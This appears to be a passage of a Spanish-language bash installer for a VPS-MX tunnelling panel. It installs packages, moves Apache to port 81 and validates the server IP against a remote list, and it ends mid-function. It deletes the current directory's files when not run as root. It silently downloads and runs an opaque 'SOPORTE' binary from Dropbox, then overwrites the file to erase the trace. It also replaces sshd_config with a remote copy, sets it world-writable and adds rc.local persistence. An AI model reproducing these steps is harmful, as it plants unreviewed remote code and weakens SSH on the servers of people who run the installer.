 #!/bin/bash
clear
if [ `whoami` != 'root' ]
	then 
     echo -e "\e[1;31mPARA PODER USAR EL INSTALADOR ES NECESARIO SER ROOT\nAUN NO SABES COMO INICAR COMO ROOT?\nDIJITA ESTE COMANDO EN TU TERMINAL ( sudo -i )\e[0m" 
     rm *
     exit 
fi
msg () {
BRAN='\033[1;37m' && VERMELHO='\e[31m' && VERDE='\e[32m' && AMARELO='\e[33m'
AZUL='\e[34m' && MAGENTA='\e[35m' && MAG='\033[1;36m' &&NEGRITO='\e[1m' && SEMCOR='\e[0m'
 case $1 in
  -ne)cor="${VERMELHO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
  -ama)cor="${AMARELO}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -verm)cor="${AMARELO}${NEGRITO}${VERMELHO}" && echo -e "${cor}${2}${SEMCOR}";;
  -azu)cor="${MAG}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -verd)cor="${VERDE}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -bra)cor="${BRAN}" && echo -ne "${cor}${2}${SEMCOR}";;
  "-bar2"|"-bar")cor="${VERMELHO}————————————————————————————————————————————————————" && echo -e "${SEMCOR}${cor}${SEMCOR}";;
 esac
}
os_system(){
#code by rufu99
  system=$(cat -n /etc/issue |grep 1 |cut -d ' ' -f6,7,8 |sed 's/1//' |sed 's/      //')
  distro=$(echo "$system"|awk '{print $1}')

  case $distro in
    Debian)vercion=$(echo $system|awk '{print $3}'|cut -d '.' -f1);;
    Ubuntu)vercion=$(echo $system|awk '{print $2}'|cut -d '.' -f1,2);;
  esac

  link="https://raw.githubusercontent.com/rudi9999/ADMRufu/main/Repositorios/${vercion}.list"

  case $vercion in
    8|9|10|11|16.04|18.04|20.04|20.10|21.04|21.10|22.04)wget -O /etc/apt/sources.list ${link} &>/dev/null;;
  esac
}
funbar() {
    comando="$1"
    _=$(
        $comando >/dev/null 2>&1
    ) &
    >/dev/null
    pid=$!
    while [[ -d /proc/$pid ]]; do
        echo -ne "  \033[1;33m["
        for ((i = 0; i < 20; i++)); do
            echo -ne "\033[1;31m#"
            sleep 0.08
        done
        echo -ne "\033[1;33m]"
        sleep 0.5s
        echo
        tput cuu1 && tput dl1
    done
    [[ $(dpkg --get-selections | grep -w "$paquete" | head -1) ]] || ESTATUS=$(echo -e "\033[91m  INSTALACION FALLIDA") &>/dev/null
    [[ $(dpkg --get-selections | grep -w "$paquete" | head -1) ]] && ESTATUS=$(echo -e "\033[1;33m       \033[92mINSTALADO") &>/dev/null
    echo -ne "  \033[1;31m[\033[1;35m>>>>>>>>>>>>>>>>>>>>\033[1;31m] $ESTATUS \033[0m\n" |pv -qL 30
    sleep 0.5s
}

dependencias() {
  dpkg --configure -a >/dev/null 2>&1
  apt -f install -y >/dev/null 2>&1
  soft="sudo grep less zip unzip ufw curl dos2unix python python3 python3-pip openssl cron iptables lsof pv boxes at mlocate gawk bc jq curl socat netcat net-tools cowsay figlet lolcat apache2"
  for i in $soft; do
    paquete="$i"
    echo -e "\033[93m    ❯ \e[97mINSTALANDO PAQUETE \e[36m $i"
#  [[ $(dpkg --get-selections|grep -w "$i"|head -1) ]] || 
 funbar "apt-get install $i -y"
  done
}

msg -bar2
echo -e "   \e[1;97m\e[1;100m =====>>►►  SCRIPT MOD LACASITAMX  ◄◄<<===== \033[0m"
msg -bar2
msg -ama "               PREPARANDO INSTALACION"
msg -bar2
INSTALL_DIR_PARENT="/usr/local/vpsmxup/"
INSTALL_DIR=${INSTALL_DIR_PARENT}
if [ ! -d "$INSTALL_DIR" ]; then
	mkdir -p "$INSTALL_DIR_PARENT"
	cd "$INSTALL_DIR_PARENT"
wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/zzupdate/zzupdate.default.conf -O /usr/local/vpsmxup/vpsmxup.default.conf  &> /dev/null
 
else
	echo ""
fi
echo ""
#by 00

clear
function printTitle
{
    echo ""
    echo -e "\033[1;92m$1\033[1;91m"
    printf '%0.s-' $(seq 1 ${#1})
    echo ""
}

printTitle "Limpieza de caché local"
apt-get clean

printTitle "Actualizar información de paquetes disponibles"
apt-get update
apt list --upgradable &>/dev/null 
printTitle "PAQUETES DE ACTUALIZACIÓN"
apt-get dist-upgrade -y
clear
clear
apt-get install pv -y &> /dev/null
[[ $(dpkg --get-selections|grep -w "pv"|head -1) ]] || apt-get install pv -y &>/dev/null
apt-get install pv -y -qq --silent > /dev/null 2>&1
os_system
MI=$(wget -qO- ifconfig.me)
echo "$distro $vercion" >/tmp/distro
echo -e "\e[1;31m	🖥SISTEMA: \e[33m$distro $vercion   " 
echo -e "\e[1;31m	🖥IP: \e[33m$MI   "
#apt list --upgradable &>/dev/null && echo -e "\033[97m    ❯ INSTALANDO APT-LIST " | pv -qL 50 |lolcat -as 500
msg -bar2
echo -e "   \e[1;97m\e[1;100m =====>>►►  SCRIPT MOD LACASITAMX  ◄◄<<===== \033[0m"
msg -bar
echo -e "\033[97m"
echo -e "  \033[41m    -- INSTALACION DE PAQUETES  --    \e[49m"
#echo -e "  \033[100m     PONER ATENCION  PARA SIGUIENTE PREGUNTA     "
echo -e "\033[97m"
msg -bar
if [[ -e /etc/casitapak ]]; then
dpkg --configure -a > /dev/null 2>&1 && echo -e "\033[93m    ❯\e[97m INTENTANDO RECONFIGURAR  " | pv -qL 40 
sudo apt-get install lolcat -y &>/dev/null
sudo gem install lolcat -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || apt-get install curl -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] || apt-get install lolcat -y &>/dev/null
apt-get install at -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] || apt-get install at -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || apt-get install nano -y &>/dev/null
#iptables
#[[ $(dpkg --get-selections|grep -w "iptables"|head -1) ]] || apt-get install iptables -y &>/dev/null
apt-get install bc -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || apt-get install bc -y &>/dev/null
#lsof
apt-get install lsof -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || apt-get install lsof -y &>/dev/null
#figlet

apt-get install figlet -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || apt-get install figlet -y &>/dev/null
apt-get install cowsay -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] || apt-get install cowsay -y &>/dev/null
#screen
apt-get install screen -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || apt-get install screen -y &>/dev/null
#ufw
[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || apt-get install ufw -y &>/dev/null
#unzip
[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || apt-get install unzip -y &>/dev/null
#zip
[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || apt-get install zip -y &>/dev/null
apt-get install apache2 -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || apt-get install apache2 -y &>/dev/null
sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf > /dev/null 2>&1
service apache2 restart > /dev/null 2>&1
else
#dependencias
dpkg --configure -a > /dev/null 2>&1 #&& echo -e "  \033[1;33m[\033[1;31m##########\033[1;33m]       RECONFIGURANDO \033[0m\n" |pv -qL 30
apt -f install -y >/dev/null 2>&1
apt install sudo -y &>/dev/null
apt-get install grep -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "grep"|head -1) ]] || apt-get install grep -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "grep"|head -1) ]] || ESTATUS=$(echo -e "\033[91m       INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "grep"|head -1) ]] && ESTATUS=$(echo -e "\033[1;33m       \033[92mINSTALADO") &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mgrep$ESTATUS \033[0m\n" |pv -qL 50
#gawk
apt-get install gawk -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] || apt-get install gawk -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] || ESTATUS=`echo -e "\033[91m       INSTALACION FALLIDA"` &>/dev/null
[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] && ESTATUS=`echo -e "\033[92m       INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mgawk$ESTATUS \033[0m\n" |pv -qL 50
#mlocate
apt-get install mlocate -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] || apt-get install mlocate -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] || ESTATUS=$(echo -e "\033[91m    INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] && ESTATUS=`echo -e "\033[92m    INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mmlocate$ESTATUS \033[0m\n" |pv -qL 50
#lolcat gem
apt install dos2unix -y &>/dev/null
apt-get install lolcat -y &>/dev/null
sudo gem install lolcat &>/dev/null
[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] || apt-get install lolcat -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] || ESTATUS=$(echo -e "\033[91m     INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] && ESTATUS=`echo -e "\033[92m     INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mlolcat$ESTATUS \033[0m\n" |pv -qL 50
#at
apt install at -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] || apt-get install at -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] || ESTATUS=$(echo -e "\033[91m         INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] && ESTATUS=`echo -e "\033[92m         INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mat$ESTATUS \033[0m\n" |pv -qL 50
#nano
apt install nano -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || apt-get install nano -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || ESTATUS=$(echo -e "\033[91m       INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] && ESTATUS=`echo -e "\033[92m       INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mnano$ESTATUS \033[0m\n" |pv -qL 50
[[ $(dpkg --get-selections|grep -w "iptables"|head -1) ]] || apt-get install iptables -y &>/dev/null
apt install bc -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || apt-get install bc -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || ESTATUS=$(echo -e "\033[91m         INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] && ESTATUS=`echo -e "\033[92m         INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mbc$ESTATUS \033[0m\n" |pv -qL 50
apt-get install openssl -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "openssl"|head -1) ]] || apt-get install openssl -y &>/dev/null
apt install lsof -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || apt-get install lsof -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || ESTATUS=$(echo -e "\033[91m       INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] && ESTATUS=`echo -e "\033[92m       INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mlsof$ESTATUS \033[0m\n" |pv -qL 50
apt install figlet -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || apt-get install figlet -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || ESTATUS=$(echo -e "\033[91m     INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] && ESTATUS=`echo -e "\033[92m     INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mfiglet$ESTATUS \033[0m\n" |pv -qL 50
apt install cowsay -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] || apt-get install cowsay -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] || ESTATUS=$(echo -e "\033[91m     INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] && ESTATUS=`echo -e "\033[92m     INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mcowsay$ESTATUS \033[0m\n" |pv -qL 50
apt install screen -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || apt-get install screen -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || ESTATUS=$(echo -e "\033[91m     INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] && ESTATUS=`echo -e "\033[92m     INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mscreen$ESTATUS \033[0m\n" |pv -qL 50
apt install curl -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || apt-get install curl -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || ESTATUS=$(echo -e "\033[91m       INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] && ESTATUS=`echo -e "\033[92m       INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mcurl$ESTATUS \033[0m\n" |pv -qL 50
apt install less -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "less"|head -1) ]] || apt-get install less -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "less"|head -1) ]] || ESTATUS=$(echo -e "\033[91m       INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "less"|head -1) ]] && ESTATUS=`echo -e "\033[92m       INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mless$ESTATUS \033[0m\n" |pv -qL 50

[[ $(dpkg --get-selections|grep -w "cron"|head -1) ]] || apt-get install cron -y &>/dev/null && echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mcron\033[92m       INSTALADO \033[0m\n" |pv -qL 50
[[ $(dpkg --get-selections|grep -w "netcat"|head -1) ]] || apt-get install netcat -y &>/dev/null && echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mnetcat\033[92m     INSTALADO \033[0m\n" |pv -qL 50
[[ $(dpkg --get-selections|grep -w "socat"|head -1) ]] || apt-get install socat -y &>/dev/null 
[[ $(dpkg --get-selections|grep -w "boxes"|head -1) ]] || apt-get install boxes -y &>/dev/null 
[[ $(dpkg --get-selections|grep -w "jq"|head -1) ]] || apt-get install jq -y &>/dev/null && echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mjq\033[92m         INSTALADO \033[0m\n" |pv -qL 50
sudo apt-add-repository universe -y > /dev/null 2>&1
[[ $(dpkg --get-selections|grep -w "net-tools"|head -1) ]] || apt-get install net-tools -y &>/dev/null && echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mnet-tools\033[92m  INSTALADO\033[0m\n" |pv -qL 50
apt install python -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] || apt-get install python -y &>/dev/null && echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mpython\033[92m     INSTALADO\033[0m\n" |pv -qL 50
apt install python3 -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] || apt-get install python3 -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] || ESTATUS=$(echo -e "\033[91m    INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] && ESTATUS=`echo -e "\033[92m    INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mpython3$ESTATUS \033[0m\n" |pv -qL 50
apt install python3-pip -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] || apt-get install python3-pip -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] || ESTATUS=$(echo -e "\033[91mINSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m]\e[97mpython3-pip $ESTATUS \033[0m\n" |pv -qL 50
apt install ufw -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || apt-get install ufw -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || ESTATUS=$(echo -e "\033[91m        INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] && ESTATUS=`echo -e "\033[92m        INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mufw$ESTATUS \033[0m\n" |pv -qL 50
#unzip
apt install unzip -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || apt-get install unzip -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || ESTATUS=$(echo -e "\033[91m      INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] && ESTATUS=`echo -e "\033[92m      INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97munzip$ESTATUS \033[0m\n" |pv -qL 50
#zip
apt install zip -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || apt-get install zip -y &>/dev/null
#[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || ESTATUS=$(echo -e "\033[91m        INSTALACION FALLIDA") &>/dev/null
[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] && ESTATUS=`echo -e "\033[92m        INSTALADO"` &>/dev/null
echo -ne "  \033[1;33m[\033[1;31m##########\033[1;33m] \e[97mzip$ESTATUS \033[0m\n" |pv -qL 50
apt-get install apache2 -y &>/dev/null #&& echo -e "\033[93m    ❯\e[97m INSTALANDO APACHE2" | pv -qL 40 
[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || apt-get install apache2 -y &>/dev/null
sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf > /dev/null 2>&1
service apache2 restart > /dev/null 2>&1
 touch /etc/casitapak &>/dev/null
 apt-get clean &>/dev/null
msg -bar
clear
rm -rf /usr/bin/vpsmxup
rm -rf lista-arq
rm -rf LACASITA.sh

printTitle "Limpieza de paquetes (eliminación automática de paquetes no utilizados)"
apt autoremove -y &>/dev/null
  echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
  echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
apt-get install net-tools -y
printTitle "Versión actual"
lsb_release -d
idfix64_86 () {
clear
clear
msg -bar2
#msg -ama "     [ VPS - MX - SCRIPT \033[1;97m MOD\033[1;33m ]"
msg -bar2
echo ""
echo -e "\e[91m   INSTALACION SEMI MANUAL DE PAQUETES "
echo -e "\e[91m(En caso de pedir confirmacion escoja: #y#) \e[0m"
echo ""
sleep 7s
apt-get update; apt-get upgrade -y
apt-get install curl -y
apt-get install lsof -y
apt-get install sudo -y
apt-get install figlet -y
apt-get install cowsay -y
apt-get install bc -y
apt-get install python -y
apt-get install at -y
apt-get install apache2 -y
sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf
service apache2 restart
clear
clear
clear
msg -bar2
#msg -ama "     [ VPS - MX - SCRIPT \033[1;97m  MOD   \033[1;33m ]"
msg -bar2
echo ""
echo -e "\e[91mESCOJER PRIMERO #All locales# Y LUEGO #en_US.UTF-8# \e[0m" 
echo ""
sleep 7s
 export LANGUAGE=en_US.UTF-8\
   && export LANG=en_US.UTF-8\
   && export LC_ALL=en_US.UTF-8\
   && export LC_CTYPE="en_US.UTF-8"\
   && locale-gen en_US.UTF-8\
   && sudo apt-get -y install language-pack-en-base\
   && sudo dpkg-reconfigure locales
clear
}
clear
clear
#msg -bar2
#msg -ama "     [ VPS - MX - SCRIPT \033[1;97m  MOD \033[1;33m ]"
#msg -bar2
#echo -e "\033[1;97m  ¿PRECENTO ALGUN ERROR ALGUN PAQUETE ANTERIOR?" 
#msg -bar2
#echo -e "\033[1;32m 1- Escoja:(N) No. Para Instalacion Normal"
#echo -e "\033[1;31m 2- Escoja:(S) Si. Saltaron errores."
#msg -bar2
#echo -e "\033[1;39m Al preciona enter continuara la instalacion Normal"
#msg -bar2
#read -p " [ S | N ]: " idfix64_86   
#[[ "$idfix64_86" = "s" || "$idfix64_86" = "S" ]] && idfix64_86
fi
clear

 fun_ipe () { 

 MIP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1) 

 MIP2=$(wget -qO- ifconfig.me) 

 [[ "$MIP" != "$MIP2" ]] && IP="$MIP2" || IP="$MIP" 

 } 

 fun_ip () { 

 MIP2=$(wget -qO- ifconfig.me) 

 MIP=$(wget -qO- whatismyip.akamai.com) 

 if [ $? -eq 0 ]; then 

 IP="$MIP" 

 else 

 IP="$MIP2" 

 fi 

 } 

 function_verify () { 

 permited=$(curl -sSL "https://raw.githubusercontent.com/DanssBot/Generador-BOT/main/control") 

 [[ $(echo $permited|grep "${IP}") = "" ]] && { 

 clear 

 echo -e "\n\n\n\033[1;91m————————————————————————————————————————————————————\n      ¡ESTA KEY NO CONCUERDA CON EL INSTALADOR! \n      BOT: @CAT \n————————————————————————————————————————————————————\n\n\n" 

 [[ -d /etc/VPS-MX ]] && rm -rf /etc/VPS-MX 

 exit 1 

 } || { 

 v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion") 

 echo "$v1" > /etc/versin_script 

 } 

 } 

 funcao_idioma () { 

 clear 

 clear 

 msg -bar2 

 msg -bar2 

 figlet " LATIMEX" | lolcat 

 echo -e "     ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL" 

 msg -bar2 

 pv="$(echo es)" 

 [[ ${#id} -gt 2 ]] && id="es" || id="$pv" 

 byinst="true" 

 } 

 install_fim () { 
 #mkdir /etc/VPS-MX/tmp
 touch /etc/VPS-MX/tmp/style
 msg -ama "               Finalizando Instalacion" && msg bar2 

 [[ $(find /etc/VPS-MX/controlador -name nombre.log|grep -w "nombre.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/nombre.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/nombre.log &>/dev/null 

 [[ $(find /etc/VPS-MX/controlador -name IDT.log|grep -w "IDT.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/IDT.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/IDT.log &>/dev/null 

 [[ $(find /etc/VPS-MX/controlador -name tiemlim.log|grep -w "tiemlim.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/tiemlim.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/tiemlim.log &>/dev/null 

 touch /usr/share/lognull &>/dev/null 

 wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/SPR &>/dev/null -O /usr/bin/SPR &>/dev/null 

 chmod 775 /usr/bin/SPR &>/dev/null 

 wget -O /usr/bin/SOPORTE https://www.dropbox.com/s/8oi0mt9ikv5z8d0/soporte &>/dev/null 

 chmod 775 /usr/bin/SOPORTE &>/dev/null 

 SOPORTE &>/dev/null 

 echo "ACCESO ACTIVADO" >/usr/bin/SOPORTE 

 wget -O /bin/rebootnb https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/rebootnb &> /dev/null 

 chmod +x /bin/rebootnb 

 wget -O /bin/resetsshdrop https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/resetsshdrop &> /dev/null 

 chmod +x /bin/resetsshdrop 

 wget -O /etc/versin_script_new https://raw.githubusercontent.com/lacasitamx/version/master/vercion &>/dev/null 

 wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/lacasitamx/ZETA/master/sshd &>/dev/null 

 chmod 777 /etc/ssh/sshd_config 

 msg -bar2 

 echo '#!/bin/sh -e' > /etc/rc.local 

 sudo chmod +x /etc/rc.local 

 echo "sudo rebootnb" >> /etc/rc.local 

 echo "sudo resetsshdrop" >> /etc/rc.local 

 echo "sleep 2s" >> /etc/rc.local 

 echo "exit 0" >> /etc/rc.local 

 /bin/cp /etc/skel/.bashrc ~/ 

 echo 'clear' >> .bashrc 

 echo 'echo ""' >> .bashrc 

 echo 'figlet "LATIMEX"|lolcat' >> .bashrc 

 echo 'mess1="$(less /etc/VPS-MX/message.txt)" ' >> .bashrc 

 echo 'echo "" '>> .bashrc 

 echo 'echo -e "\t\033[92mRESELLER : $mess1 "'>> .bashrc 

 echo 'echo -e "\t\e[1;33mVERSION: \e[1;31m$(cat /etc/versin_script_new)"'>> .bashrc 

 echo 'echo "" '>> .bashrc 

 echo 'echo -e "\t\033[97mPARA MOSTAR PANEL BASH ESCRIBA: sudo menu "'>> .bashrc 

 echo 'echo ""'>> .bashrc 

 echo -e "         COMANDO PRINCIPAL PARA ENTRAR AL PANEL " 

 echo -e "  \033[1;41m               menu             \033[0;37m" && msg -bar2 

 rm -rf /usr/bin/pytransform &> /dev/null 

 rm -rf LACASITA.sh 

 rm -rf lista-arq 

 service ssh restart &>/dev/null 

 exit 

 } 

  ofus () { 
 unset server 
 server=$(echo ${txt_ofuscatw}|cut -d':' -f1) 
 unset txtofus 
 number=$(expr length $1) 
 for((i=1; i<$number+1; i++)); do 
 txt[$i]=$(echo "$1" | cut -b $i) 
 case ${txt[$i]} in 
 ".")txt[$i]="C";; 
 "C")txt[$i]=".";; 
 "3")txt[$i]="@";; 
 "@")txt[$i]="3";; 
 "5")txt[$i]="9";; 
 "9")txt[$i]="5";; 
 "6")txt[$i]="P";; 
 "P")txt[$i]="6";; 
 "L")txt[$i]="O";; 
 "O")txt[$i]="L";; 
 esac 
 txtofus+="${txt[$i]}" 
 done 
 echo "$txtofus" | rev 
 } 

 verificar_arq () { 

 [[ ! -d ${SCPdir} ]] && mkdir ${SCPdir} 
 
 [[ ! -d ${tmp} ]] && mkdir ${tmp} 
 touch /etc/VPS-MX/tmp/style
 [[ ! -d ${SCPusr} ]] && mkdir ${SCPusr} 

 [[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm} 

 [[ ! -d ${SCPinst} ]] && mkdir ${SCPinst} 

 case $1 in 

 "menu"|"message.txt"|"ID")ARQ="${SCPdir}/";; #Menu 

 "usercodes")ARQ="${SCPusr}/";; #Panel SSRR 
 
 "ADMbot.sh")ARQ="${SCPfrm}/";;
 
 "apacheon.sh")ARQ="${SCPfrm}/";;
 
 "tcp.sh")ARQ="${SCPfrm}/";;
 
 "fai2ban.sh")ARQ="${SCPfrm}/";;
 
 "blockBT.sh")ARQ="${SCPfrm}/";;
 
 "ultrahost")ARQ="${SCPfrm}/";;
 
 "speed.py")ARQ="${SCPfrm}/";;
 
 "squidpass.sh")ARQ="${SCPfrm}/";;

 "C-SSR.sh")ARQ="${SCPinst}/";; #Panel SSR 
 
 "extras.sh")ARQ="${SCPinst}/";; #Panel SSR 

 "openssh.sh")ARQ="${SCPinst}/";; #OpenVPN 

 "squid.sh")ARQ="${SCPinst}/";; #Squid 

 "dropbear.sh"|"proxy.sh")ARQ="${SCPinst}/";; #Instalacao 

 "proxy.sh")ARQ="${SCPinst}/";; #Instalacao 

 "openvpn.sh")ARQ="${SCPinst}/";; #Instalacao 

 "ssl.sh"|"python.py")ARQ="${SCPinst}/";; #Instalacao 

 "shadowsocks.sh")ARQ="${SCPinst}/";; #Instalacao 

 "Shadowsocks-libev.sh")ARQ="${SCPinst}/";; #Instalacao 

 "Shadowsocks-R.sh")ARQ="${SCPinst}/";; #Instalacao 

 "v2ray.sh"|"slowdns.sh")ARQ="${SCPinst}/";; #Instalacao 

 "budp.sh")ARQ="${SCPinst}/";; #Instalacao 

 "sockspy.sh"|"PDirect.py"|"PPub.py"|"PPriv.py"|"POpen.py"|"PGet.py")ARQ="${SCPinst}/";; #Instalacao 

 *)ARQ="${SCPfrm}/";; #Herramientas 

 esac 

 mv -f ${SCPinstal}/$1 ${ARQ}/$1 

 chmod +x ${ARQ}/$1 

 } 

 NOTIFY () { 

 clear 

 clear 

 msg -bar 

